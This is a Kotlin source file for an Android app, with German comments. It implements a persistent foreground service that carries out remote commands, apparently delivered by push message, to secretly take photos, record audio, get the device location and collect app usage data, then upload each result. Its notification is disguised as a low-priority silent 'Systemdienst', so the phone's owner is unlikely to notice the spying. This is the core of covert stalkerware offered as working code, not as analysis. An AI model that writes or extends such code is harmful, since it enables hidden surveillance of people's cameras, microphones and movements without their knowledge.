package com.ikianti.app.service

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.ikianti.app.capture.AudioCapture
import com.ikianti.app.capture.CameraCapture
import com.ikianti.app.capture.LocationCapture
import com.ikianti.app.capture.UsageStatsCapture

/**
 * Persistenter Foreground Service.
 *
 * Wird beim App-Start aus dem Vordergrund gestartet (wichtig für Android 12+
 * Kamera/Mikro-Zugriff). Läuft dauerhaft im Hintergrund.
 *
 * Empfängt Befehle über:
 * 1. Lokalen Broadcast (wenn Service läuft)
 * 2. Gespeicherten Befehl in SharedPreferences (wenn Service neu gestartet wird)
 */
class CaptureForegroundService : Service() {

    companion object {
        const val ACTION_COMMAND = "com.ikianti.app.ACTION_COMMAND"
        const val EXTRA_COMMAND  = "command"
        private const val CHANNEL_ID      = "sys_service_channel"
        private const val NOTIFICATION_ID = 1
        private const val TIMEOUT_MS      = 30_000L
        private const val TAG             = "CaptureFGS"

        fun start(context: Context) {
            val intent = Intent(context, CaptureForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun sendCommand(context: Context, command: String) {
            val intent = Intent(ACTION_COMMAND).apply {
                putExtra(EXTRA_COMMAND, command)
                setPackage(context.packageName)
            }
            context.sendBroadcast(intent)
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var isBusy = false

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action != ACTION_COMMAND) return
            val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
            Log.d(TAG, "Broadcast-Befehl: $command")
            // Gespeicherten Befehl löschen da wir ihn jetzt verarbeiten
            FcmTriggerService.clearPendingCommand(context)
            runCommand(command)
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundCompat()

        val filter = IntentFilter(ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        // Gespeicherten Befehl aus SharedPreferences ausführen (Fallback)
        val pendingCommand = FcmTriggerService.getPendingCommand(this)
        if (pendingCommand != null) {
            Log.d(TAG, "Gespeicherter Befehl gefunden: $pendingCommand")
            FcmTriggerService.clearPendingCommand(this)
            mainHandler.postDelayed({ runCommand(pendingCommand) }, 1000)
        }

        Log.d(TAG, "Persistenter Service gestartet")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun runCommand(command: String) {
        if (isBusy) {
            Log.w(TAG, "Service beschäftigt – Befehl ignoriert: $command")
            return
        }
        isBusy = true
        Log.d(TAG, "Führe aus: $command")

        val timeoutRunnable = Runnable {
            Log.w(TAG, "Timeout: $command")
            isBusy = false
        }
        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)

        val onDone = {
            mainHandler.removeCallbacks(timeoutRunnable)
            isBusy = false
            Log.d(TAG, "Abgeschlossen: $command")
        }

        when (command) {
            "photo"    -> CameraCapture(this).captureAndUpload { onDone() }
            "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10) { onDone() }
            "location" -> LocationCapture(this).fetchAndUpload { onDone() }
            "usage"    -> UsageStatsCapture(this).collectAndUpload { onDone() }
            else       -> { Log.w(TAG, "Unbekannt: $command"); isBusy = false }
        }
    }

    private fun startForegroundCompat() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Systemdienste", NotificationManager.IMPORTANCE_MIN
        ).apply {
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setContentTitle("Systemdienst")
            .setContentText("Systemprozess")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onDestroy() {
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
